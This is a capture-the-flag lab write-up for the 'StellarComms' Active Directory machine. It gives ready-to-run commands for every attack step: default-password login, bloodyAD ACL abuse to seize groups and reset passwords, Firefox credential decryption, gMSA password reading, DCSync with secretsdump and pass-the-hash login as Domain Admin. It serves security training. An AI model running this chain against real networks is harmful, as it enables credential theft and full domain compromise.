# StellarComms | Writeups

[![Logo](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fwww.hacksmarter.org%2Fapi%2Ffavicon.ico\&width=20\&dpr=3\&quality=100\&sign=6e985eb0\&sv=2)CourseStackwww.hacksmarter.orgchevron-right](https://www.hacksmarter.org/courses/e0f57d12-2c23-4d6a-8c55-b85010526e52)

The following post by 0xb0b is licensed under [CC BY 4.0![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fmirrors.creativecommons.org%2Fpresskit%2Ficons%2Fcc.svg%3Fref%3Dchooser-v1\&width=40\&dpr=3\&quality=100\&sign=7f04aa2e\&sv=2)![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fmirrors.creativecommons.org%2Fpresskit%2Ficons%2Fby.svg%3Fref%3Dchooser-v1\&width=40\&dpr=3\&quality=100\&sign=c8892a07\&sv=2)arrow-up-right](http://creativecommons.org/licenses/by/4.0/?ref=chooser-v1)

***

### [hashtag](stellarcomms-or-writeups.md#scenario) Scenario

#### [hashtag](stellarcomms-or-writeups.md#user-content-objective--scope) Objective / Scope

Stellar Communications, a regional telecommunications provider, has retained the Hack Smarter Red Team to conduct a covert internal network penetration test. The client is concerned about the resilience of their internal Active Directory infrastructure against insider threats and compromised VPN endpoints.

Your objective is to simulate a compromised remote worker, pivot through the internal network, and demonstrate the ability to compromise high-value targets (HVTs) without triggering the Blue Team's SOC alerts.

#### [hashtag](stellarcomms-or-writeups.md#user-content-initial-access) Initial Access

Our initial access team has successfully established a VPN tunnel into the environment. We have identified a valid username, likely belonging to a new hire or junior staff member.

* **Valid User:**
  * **Username:**`junior.analyst`
  * **Password:** _Unknown_

### [hashtag](stellarcomms-or-writeups.md#summary) Summary

chevron-rightSummary [hashtag](stellarcomms-or-writeups.md#summary-1)

In StellarComms we begin as a simulated remote worker with VPN access and an identified username, `junior.analyst`. Enumeration of the domain controller `DC-STELLAR` reveals an exposed FTP service containing onboarding documents that disclose default passwords. Using these, we authenticate as `junior.analyst` and perform BloodHound enumeration, discovering a misconfigured ACL allowing `WriteOwner` over the `stellar-ops_control` group. Abusing this, we gain full control of the group and reset the password of `ops.controller`, achieving remote access via WinRM. From this foothold, we extract Firefox credentials from local profiles, revealing the password of `astro.researcher`. With this account, we leverage a `WriteDACL` privilege over `eng.payload` to reset its password, and from there, read the managed password of the gMSA account `satlink-service$`. Since this account has `DCSync` rights, we replicate domain credentials and recover the NT hash of the Administrator account. Using Pass-the-Hash via WinRM, we log in as Domain Admin and retrieve the final flag.

### [hashtag](stellarcomms-or-writeups.md#recon) Recon

We use rustscan `-b 500 -a 10.1.129.141 -- -sC -sV -Pn` to enumerate all TCP ports on the `stellarcomms` machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

Copy

```
rustscan -b 500 -a 10.1.129.141 -- -sC -sV -Pn
```

![](<../../../.gitbook/assets/image (2)>)

The `stellarcomms` machine is actually a domain controller with exposed services including FTP `21` allowing anonymour login, DNS `53`, Kerberos `88/464`, an `IIS /10.0` web server on port `80`, multiple MSRPC endpoints `135, 593, 49664+`, SMB `139/445`, LDAP and LDAPS `389/636/3268/3269` tied to Active Directory, RDP `3389`, and .NET Remoting `9389`. This indicates a fully integrated Windows AD environment where LDAP/LDAPS and Kerberos provide authentication, SMB and RPC enable remote management, and RDP/WinRM serve as remote access points.

![](<../../../.gitbook/assets/image (1) (1)>)

![](<../../../.gitbook/assets/image (2) (1)>)

#### [hashtag](stellarcomms-or-writeups.md#ftp) FTP

We start with the FTP service and gain access via `anonymous` login.

Here we find documents in the `Docs` folder. Among other things, we find something that could refer to onboarding documents: `Stellar_UserGuide.pdf`.

![](<../../../.gitbook/assets/image (3)>)

We download every file and inspect each. It turns out that `Stellar_UserGuide.pdf` is for real an on-boarding document. Among other things, it contains default credentials a default password for testing purposes. We note that down.

![](<../../../.gitbook/assets/image (4)>)

#### [hashtag](stellarcomms-or-writeups.md#web) WEB

For now, we'll continue and take a look at the website hosted via the IIS. It appears to be a purely static site. We find a contact form, but it doesn't seem to be functional.

At the gallery we find some Pictures. In the metadata of the pictures, we find the artist and creator who is the provided user from the scenario.

![](<../../../.gitbook/assets/image (362)>)

#### [hashtag](stellarcomms-or-writeups.md#smb) SMB

Before we dive in with the credentials of the on-boarding document and the provided user we try to authenticate as `guest` and anonymously against SMB, but without success. Nevertheless we generate the hosts file entry like the following

Copy

```
nxc smb 10.1.129.141 -u '' -p ''  --generate-hosts-file hosts
```

![](<../../../.gitbook/assets/image (363)>)

We add the following to our `/etc/hosts` file. We could also directly append the entry to our hosts file by providing the path to `/etc/hosts` in the NetExec command.

Copy

```
10.1.129.141     DC-STELLAR.stellarcomms.local stellarcomms.local DC-STELLAR
```

### [hashtag](stellarcomms-or-writeups.md#access-as-junior.analyst) Access as junior.analyst

We test whether the `junior.analyst` user is using the default password. To do this, we use NetExec to authenticate ourselves to SMB as `junior.analyst`. We are successful. However, we do not find any special shares.

We could enumerate further users from here, but we will skip this and enumerate the domain using BloodHound, since we now have access as the user `junior.analyst`.

Copy

```
nxc smb DC-STELLAR.stellarcomms.local -u 'junior.analyst' -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (364)>)

### [hashtag](stellarcomms-or-writeups.md#bloodhound-enumeration) BloodHound Enumeration

We enumerate the AD using BloodHound.

Copy

```
bloodhound-ce.py --zip -c All -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' -dc DC-STELLAR.stellarcomms.local -ns 10.1.129.141
```

![](<../../../.gitbook/assets/image (365)>)

We identify the Domain Admin.

![](<../../../.gitbook/assets/image (366)>)

And we see that the user junior.analyst has WriteOwner permission to the `stellar-ops_control` group.

This would allow us to set ourselves as the owner of the group, then set `GenericAll` to the group, so that we can add ourselves as the user `junior.analyst` and thus gain the permissions of the group and move laterally. But first, let's see what the group can do.

![](<../../../.gitbook/assets/image (367)>)

We query for the `Shortest Path from Owned objects`. We see that we can move laterally via our `WriteOwner` over the `stellar-ops_control` group, from there we can change the password of the user `ops.controller` via the ForceChangePassword permission. With that resulting user we can gain initial foothold, since the user is in the `remote management users` group.

![](<../../../.gitbook/assets/image (368)>)

Furthermore we query for the `Shortest Path to Domain Admins`. We observe that we can move laterally via the `WriteDacl` permission of the `astro.researcher` user over `eng.payload`, allowing us to grant ourselves access to read the `gMSA password` of `satlink.services`. From there, we can authenticate as `satlink.services`, which has `DC Sync` privileges, which allows us to simulate the replication process from the domain controller. This leads to the compromise of the credential material on the domain controller.

However, we also see that there is no path from `junior.analyst` to `astro.researcher`. So we need to make sure that we escalate from our foothold on to `astro.researcher` in order to fully compromise the domain controller.

![](<../../../.gitbook/assets/image (369)>)

### [hashtag](stellarcomms-or-writeups.md#shell-as-ops.controller) Shell as ops.controller

We first pursue our enumerated attack path from our Bloodhound enumeration and escalate from `junior.analyst` to `ops.controller` to gain initial foothold on the domain controller.

Recalling the results form the enumeration:

> We query for the `Shortest Path from Owned objects`. We see that we can move laterally via our `WriteOwner` over the `stellar-ops_control` group, from there we can change the password of the user `ops.controller` via the ForceChangePassword permission. With that resulting user we can gain initial foothold, since the user is in the `remote management users` group.

First we need to add `junior.analyst` to the `stellar-ops_control` group.

> And we see that the user junior.analyst has WriteOwner permission to the `stellar-ops_control` group.
>
> This would allow us to set ourselves as the owner of the group, then set `GenericAll` to the group, so that we can add ourselves as the user `junior.analyst` and thus gain the permissions of the group and move laterally. But first, let's see what the group can do.

[**hashtag**](stellarcomms-or-writeups.md#writeowner-greater-than-change-ourself-to-owner) **WriteOwner -> change ourself to owner**

We change the ownership of the target Active Directory object `stellarops-control` to our controlled account `junior.analyst` so we gain full control over it.

[![Logo](<../../../.gitbook/assets/image (33)>)Grant ownership | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/grant-ownership#grant-ownership)

Copy

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner $TargetObject $ControlledPrincipal
```

Copy

```
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' set owner 'stellarops-control' 'junior.analyst'
```

![](<../../../.gitbook/assets/image (371)>)

[**hashtag**](stellarcomms-or-writeups.md#grant-us-genericall-over-the-group) **Grant us GenericAll over the Group**

We grant the account `junior.analyst``GenericAll` permissions over the target group `stellarops-control`, giving us full control over the object and its attributes.

[![Logo](<../../../.gitbook/assets/image (33)>)Grant rights | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)

Copy

```
# Give full control (with inheritance to the child object if applicable)
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
```

Copy

```
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' add genericAll 'stellarops-control' "junior.analyst"
```

![](<../../../.gitbook/assets/image (372)>)

[**hashtag**](stellarcomms-or-writeups.md#addmember-add-junior.analyst-to-the-group) **AddMember: Add junior.analyst to the group**

We add the account `junior.analyst` as a member of the `stellarops-control` group to inherit its privileges.

This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights` or `Self-Membership`, over the target group.

[![Logo](<../../../.gitbook/assets/image (33)>)AddMember | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/addmember)

Copy

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```

Copy

```
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' add groupMember 'stellarops-control' 'junior.analyst'
```

![](<../../../.gitbook/assets/image (373)>)

[**hashtag**](stellarcomms-or-writeups.md#forcechangepassword) **ForceChangePassword**

We reset the password of the `ops.controller` account to a known value, allowing us to authenticate as that user.

[![Logo](<../../../.gitbook/assets/image (33)>)ForceChangePassword | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

Copy

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

Copy

```
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' set password 'ops.controller' 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (374)>)

We test the credentials using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

Copy

```
nxc smb DC-STELLAR.stellarcomms.local -u 'ops.controller' -p 'Pwned123@!' --shares
```

![](<../../../.gitbook/assets/image (375)>)

Next, we get an interactive session using evil-winrm and are able to connect. We find the user flag at `C:\Users\ops.controller\Desktop\user.txt`.

Copy

```
evil-winrm -i DC-STELLAR.stellarcomms.local -u 'ops.controller' -p 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (376)>)

### [hashtag](stellarcomms-or-writeups.md#access-as-astro.researcher) Access as astro.researcher

On the Desktop of `ops.controller` we find an installer for Firefox 91.0 esr next to the flag. What we could try now is to extract the browser credentials.

![](<../../../.gitbook/assets/image (377)>)

There is also an interesting article on this topic that goes into detail about various browsers.

[Decrypting Browser Credentials For Fun (But Not Profit)\_Apr4hchevron-right](https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/)

What we need in the end is a `logins.json` and a `key4.db` file to decrypt the credentials of a firefox profile.

> [**hashtag**](stellarcomms-or-writeups.md#where-are-the-creds-stored-1) **Where are the creds stored?**
>
> Users’ Firefox profiles are each stored in their own directory under `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\`. In recent versions of Firefox, there are two relevant artefacts required for decryption of stored credentials.
>
> * `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\key4.db`
> * `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\logins.json`

We find the following two profiles: `67wyvfsfs.default` and `v8mn7ijj.default-esr`.

Copy

```
C:\Users\ops.controller\APPDATA\Roaming\Mozilla\Firefox\profiles
```

![](<../../../.gitbook/assets/image (378)>)

Of which `v8mn7ijj.default-esr...`

![](<../../../.gitbook/assets/image (379)>)

is not empty, we download both required files:

Copy

```
download key4.db
```

Copy

```
download logins.json
```

![](<../../../.gitbook/assets/image (380)>)

To extract the credentials from the files we can make use of the following project called `firepwd`:

[![Logo](<../../../.gitbook/assets/image (39)>)GitHub - lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwordsGitHubchevron-right](https://github.com/lclevy/firepwd)

We try to decrypt the credentials contained in the `v8mn7ijj.default-esr` (the folder contains both files) and find the credentials of `astro.reaseacher`.

Copy

```
python firepwd/firepwd-ng.py -d v8mn7ijj.default-esr
```

![](<../../../.gitbook/assets/image (382)>)

We test the credentials using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

Copy

```
nxc smb DC-STELLAR.stellarcomms.local -u 'astro.researcher' -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (383)>)

Recalling our BloodHound enumeration, we can now follow the attack path starting from `astro.researcher` to completely compromise the domain controller.

> Furthermore we query for the `Shortest Path to Domain Admins`. We observe that we can move laterally via the `WriteDacl` permission of the `astro.researcher` user over `eng.payload`, allowing us to grant ourselves access to read the `gMSA password` of `satlink.services`. From there, we can authenticate as `satlink.services`, which has `DC Sync` privileges, which allows us to simulate the replication process from the domain controller. This leads to the compromise of the credential material on the domain controller.
>
> However, we also see that there is no path from `junior.analyst` to `astro.researcher`. So we need to make sure that we escalate from our foothold on to `astro.researcher` in order to fully compromise the domain controller.

![](<../../../.gitbook/assets/image (384)>)

### [hashtag](stellarcomms-or-writeups.md#access-as-eng.payload) Access as eng.payload

[**hashtag**](stellarcomms-or-writeups.md#grant-us-genericall-over-the-eng.payload) **Grant us GenericAll over the eng.payload**

We grant the account `astro.researcher``GenericAll` permissions over the `eng.payload` user, giving us full control to modify it as needed.

[![Logo](<../../../.gitbook/assets/image (33)>)Grant rights | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)

Copy

```
# Give full control (with inheritance to the child object if applicable)
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
```

Copy

```
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'astro.researcher' -p 'REDACTED' add genericAll 'eng.payload' 'astro.researcher'
```

![](<../../../.gitbook/assets/image (385)>)

[**hashtag**](stellarcomms-or-writeups.md#forcechangepassword-1) **ForceChangePassword**

Now we reset the password of the `eng.payload`, since we have `GenericAll` permissions over that.

[![Logo](<../../../.gitbook/assets/image (33)>)ForceChangePassword | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

Copy

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

Copy

```
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'astro.researcher' -p 'REDACTED' set password 'eng.payload' 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (386)>)

We test the credentials using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

Copy

```
nxc smb DC-STELLAR.stellarcomms.local -u 'eng.payload' -p 'Pwned123@!' --shares
```

![](<../../../.gitbook/assets/image (387)>)

### [hashtag](stellarcomms-or-writeups.md#access-as-satlink-services) Access as satlink-services

[**hashtag**](stellarcomms-or-writeups.md#readgmsapassword) **ReadGMSAPassword**

We read the managed password of the gMSA account `satlink-service$` by querying its `msDS-ManagedPassword` attribute using our authorized access via `eng.payload`.

[![Logo](<../../../.gitbook/assets/image (33)>)ReadGMSAPassword | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword#readgmsapassword)

> This abuse stands out a bit from other abuse cases. It can be carried out when controlling an object that has enough permissions listed in the target gMSA account's `msDS-GroupMSAMembership` attribute's DACL. Usually, these objects are principals that were configured to be explictly allowed to use the gMSA account.
>
> The attacker can then read the gMSA (group managed service accounts) password of the account if those requirements are met.

Copy

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword
```

We retrive the NT hash of `satlink-service$`.

Copy

```
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'eng.payload' -p 'Pwned123@!' get object 'satlink-service$' --attr msDS-ManagedPassword
```

![](<../../../.gitbook/assets/image (388)>)

We test the hash using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

Copy

```
nxc smb DC-STELLAR.stellarcomms.local -u 'satlink-service$' -H 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (389)>)

### [hashtag](stellarcomms-or-writeups.md#shell-as-domain-administrator) Shell as Domain Administrator

Now that we have access as `satlink-service$` we can perform the DCSync attack.

[![Logo](<../../../.gitbook/assets/image (33)>)DCSync | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync#dcsync)

> DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. This attack can lead to the compromise of major credential material such as the Kerberos `krbtgt` keys used legitimately for tickets creation, but also for [tickets forgingarrow-up-right](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/index) by attackers. The consequences of this attack are similar to an [NTDS.dit dump and parsingarrow-up-right](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds) but the practical aspect differ. A DCSync is not a simple copy & parse of the NTDS.dit file, it's a `DsGetNCChanges` operation transported in an RPC request to the DRSUAPI (Directory Replication Service API) to replicate data (including credentials) from a domain controller.

Copy

```
# with Pass-the-Hash
secretsdump -outputfile 'dcsync' -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"@"$DC_HOST"
```

We perform the secretsdump and are able to retrieve the NT hash of the Domain Admin among others.

Copy

```
secretsdump -outputfile 'dcsync' -hashes :'REDACTED' -dc-ip DC-STELLAR.stellarcomms.local 'stellarcomms.local/satlink-service$@DC-STELLAR.stellarcomms.local'
```

![](<../../../.gitbook/assets/image (390)>)

We log in as the Domain Admin using the retrieved hash via evil-winrm. We find the final flag at `C:\Users\Administrator\Desktop\root.txt`.

Copy

```
evil-winrm -i DC-STELLAR.stellarcomms.local -u 'Administrator' -H 'REDACTED'
```

![](<../../../.gitbook/assets/image (391)>)

[PreviousRace Conditionschevron-left](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2026/race-conditions) [NextVerbosechevron-right](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2026/verbose)

Last updated 3 months ago

Was this helpful?

This site uses cookies to deliver its service and to analyze traffic. By browsing this site, you accept the [privacy policy](https://policies.gitbook.com/privacy/cookies).

close

AcceptReject
